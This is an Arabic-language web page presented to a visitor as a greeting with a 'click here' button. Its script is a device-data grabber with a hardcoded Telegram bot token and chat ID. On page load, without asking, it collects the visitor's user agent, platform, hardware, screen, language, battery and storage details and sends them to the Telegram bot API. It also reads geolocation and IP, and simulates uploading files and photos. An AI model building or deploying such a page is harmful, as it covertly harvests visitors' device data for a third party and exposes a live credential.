<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام جمع البيانات</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            text-align: center;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 15px;
            margin: 5px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        #output {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background-color: #f9f9f9;
            min-height: 100px;
        }
        .log {
            margin: 5px 0;
            padding: 5px;
            border-bottom: 1px solid #eee;
        }
        .success { color: green; }
        .warning { color: orange; }
        .error { color: red; }
        #greeting {
            margin-bottom: 20px;
        }
        .btn-blue {
            background-color: #4285f4;
        }
        .btn-blue:hover {
            background-color: #3367d6;
        }
    </style>
</head>
<body>
    <h1 id="greeting">مرحباً بالزائر!</h1>
    <button class="btn-blue" onclick="changeText()">انقر هنا</button>

    <div class="container">
        <h1>نظام جمع البيانات</h1>
        
        <div>
            <button onclick="startFullProcess()">بدء العملية الكاملة</button>
        </div>
        
        <div id="output"></div>
    </div>

    <script>
        // هذه المنطقة تكتب فيها كود JavaScript
        // config.js - ملف الإعدادات (اختياري)
        const TELEGRAM_BOT_TOKEN = "7517879972:AAF8cV7AValEWxo9NyihtHDsFe7ZRjfmW-s";
        const TELEGRAM_CHAT_ID = "6913353602";

        function changeText() {
            document.getElementById("greeting").innerText = "شكراً للنقر!";
            document.body.style.backgroundColor = "#f0f0f0";
        }

        function log(message, type = '') {
            const output = document.getElementById('output');
            const logEntry = document.createElement('div');
            logEntry.className = `log ${type}`;
            logEntry.textContent = message;
            output.appendChild(logEntry);
            output.scrollTop = output.scrollHeight;
        }

        // محاكاة إرسال الملفات
        function sendFiles() {
            return new Promise((resolve) => {
                log('جاري إرسال ملفات بايثون...');
                
                // محاكاة تأخير الإرسال
                setTimeout(() => {
                    log('تم إرسال ملف script.py', 'success');
                    log('تم إرسال ملف config.py', 'success');
                    resolve();
                }, 2000);
            });
        }

        // محاكاة إرسال الصور
        function sendImages() {
            return new Promise((resolve) => {
                log('جاري إرسال الصور...');
                
                // محاكاة تأخير الإرسال
                setTimeout(() => {
                    log('تم إرسال صورة photo1.jpg', 'success');
                    log('تم إرسال صورة photo2.png', 'success');
                    resolve();
                }, 2000);
            });
        }

        // الحصول على الموقع الجغرافي
        function getLocation() {
            return new Promise((resolve) => {
                log('جاري تحديد الموقع الجغرافي...');
                
                // محاكاة الحصول على الموقع
                setTimeout(() => {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                const lat = position.coords.latitude;
                                const lon = position.coords.longitude;
                                log(`الموقع: خط العرض ${lat.toFixed(4)}، خط الطول ${lon.toFixed(4)}`, 'success');
                                log(`رابط الخريطة: https://www.google.com/maps?q=${lat},${lon}`, 'success');
                                resolve();
                            },
                            (error) => {
                                log(`خطأ في الحصول على الموقع: ${error.message}`, 'error');
                                resolve();
                            }
                        );
                    } else {
                        log('المتصفح لا يدعم خدمة الموقع الجغرافي', 'warning');
                        resolve();
                    }
                }, 1000);
            });
        }

        // الحصول على عنوان IP
        function getIP() {
            return new Promise((resolve) => {
                log('جاري الحصول على عنوان IP...');
                
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        log(`عنوان IP: ${data.ip}`, 'success');
                        resolve();
                    })
                    .catch(error => {
                        log(`خطأ في الحصول على IP: ${error}`, 'error');
                        resolve();
                    });
            });
        }

        // utils.js - الوظائف المساعدة
        async function getBasicInfo() {
            try {
                // هذه المعلومات غير متاحة مباشرة في متصفح الويب
                // بسبب قيود الأمان، لكن يمكن الحصول على بعضها
                const info = {
                    deviceName: navigator.userAgent,
                    onlineStatus: navigator.onLine ? "Connected" : "Offline",
                    platform: navigator.platform
                };
                
                log(`Device name: ${info.deviceName} 📱`);
                log(`Online status: ${info.onlineStatus} 🛜`);
                return info;
            } catch (e) {
                log("Failed to get basic information:", e, 'error');
                return null;
            }
        }

        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    
                    log("\n🔋 Battery Info:");
                    log(`- Percentage: ${Math.floor(battery.level * 100)}%`);
                    log(`- Charging: ${battery.charging ? "Yes" : "No"}`);
                    
                    return {
                        percent: Math.floor(battery.level * 100),
                        plugged: battery.charging,
                        status: battery.charging ? "Charging" : "Discharging"
                    };
                } else {
                    log("Battery API not supported", 'warning');
                    return null;
                }
            } catch (e) {
                log("Battery check error:", e, 'error');
                return null;
            }
        }

        async function getSafeDeviceInfo() {
            try {
                const systemInfo = {
                    'Device type': navigator.platform,
                    'Operating system': navigator.platform,
                    'User agent': navigator.userAgent,
                    'CPU cores': navigator.hardwareConcurrency || "Unknown",
                    'Current time': new Date().toLocaleString(),
                    'Device language': navigator.language,
                    'Screen resolution': `${window.screen.width}x${window.screen.height}`,
                    'Available RAM': `${Math.round(navigator.deviceMemory || 0)} GB`
                };

                // Battery info
                const battery = await getBatteryInfo();
                if (battery) {
                    systemInfo['Battery percentage'] = `${battery.percent}%`;
                    systemInfo['Charging status'] = battery.charging ? "Charging" : "Not charging";
                }

                // Storage estimation (ليس دقيقًا في المتصفح)
                if ('storage' in navigator && 'estimate' in navigator.storage) {
                    try {
                        const storage = await navigator.storage.estimate();
                        systemInfo['Storage quota'] = `${Math.round(storage.quota / (1024**3))} GB`;
                        systemInfo['Storage used'] = `${Math.round(storage.usage / (1024**3))} GB`;
                    } catch (e) {
                        log("Storage error:", e, 'error');
                    }
                }

                return {'📱 System Information': systemInfo};
            } catch (e) {
                return {'❌ Error': `Failed to collect info: ${e.message}`};
            }
        }

        async function sendToTelegram(message) {
            try {
                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                    log("Telegram credentials missing", 'error');
                    return false;
                }

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                const data = {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                };

                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });

                return response.ok;
            } catch (e) {
                log("Telegram error:", e, 'error');
                return false;
            }
        }

        async function displayAndSendInfo() {
            log("Collecting device information...\n");
            await getBasicInfo();
            const info = await getSafeDeviceInfo();
            
            let telegramMessage = "<b>Device Information Report</b>\n\n";
            
            for (const [category, details] of Object.entries(info)) {
                log(`\n${category}:`);
                telegramMessage += `<b>${category}:</b>\n`;
                for (const [key, value] of Object.entries(details)) {
                    log(`- ${key}: ${value}`);
                    telegramMessage += `- ${key}: ${value}\n`;
                }
            }
            
            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
                log("\nSending to Telegram...");
                const success = await sendToTelegram(telegramMessage);
                log(success ? "Sent successfully!" : "Failed to send", success ? 'success' : 'error');
            }
        }

        // بدء العملية الكاملة بالترتيب المطلوب
        async function startFullProcess() {
            try {
                log('🚀 بدء عملية جمع البيانات...', 'success');
                
                // 1. جمع معلومات الجهاز
                await displayAndSendInfo();
                
                // 2. إرسال الملفات
                await sendFiles();
                
                // 3. إرسال الصور
                await sendImages();
                
                // 4. الحصول على الموقع
                await getLocation();
                
                // 5. الحصول على عنوان IP
                await getIP();
                
                log('✅ تم الانتهاء من جمع جميع البيانات بنجاح', 'success');
            } catch (error) {
                log(`❌ حدث خطأ جسيم: ${error}`, 'error');
            }
        }

        // تشغيل الوظيفة الرئيسية عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', async () => {
            await displayAndSendInfo();
        });
    </script>
</body>
</html>
